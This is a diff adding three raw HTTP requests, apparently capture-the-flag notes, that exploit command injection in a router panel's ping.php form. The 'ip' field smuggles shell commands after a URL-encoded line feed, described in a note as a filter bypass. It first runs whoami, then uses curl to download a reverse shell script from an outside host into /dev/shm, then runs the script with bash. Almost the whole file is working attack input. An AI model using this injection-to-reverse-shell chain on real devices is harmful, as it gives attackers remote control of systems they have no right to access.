@@ -1,0 +1,48 @@
+POST /myrouterpanel/ping.php HTTP/1.1
+Host: 10.10.49.167
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://10.10.49.167
+Connection: close
+Referer: http://10.10.49.167/myrouterpanel/
+Upgrade-Insecure-Requests: 1
+
+ip=127.0.0.1%0Awhoami&submit=
+
+Bypass Line feed => %0A
+
+
+POST /myrouterpanel/ping.php HTTP/1.1
+Host: 10.10.49.167
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://10.10.49.167
+Connection: close
+Referer: http://10.10.49.167/myrouterpanel/
+Upgrade-Insecure-Requests: 1
+
+ip=127.0.0.1%0Acurl 10.8.123.104:4040 --output /dev/shm/reverse.sh&submit=
+
+
+POST /myrouterpanel/ping.php HTTP/1.1
+Host: 10.10.49.167
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://10.10.49.167
+Connection: close
+Referer: http://10.10.49.167/myrouterpanel/
+Upgrade-Insecure-Requests: 1
+
+ip=127.0.0.1%0Abash /dev/shm/reverse.sh&submit=
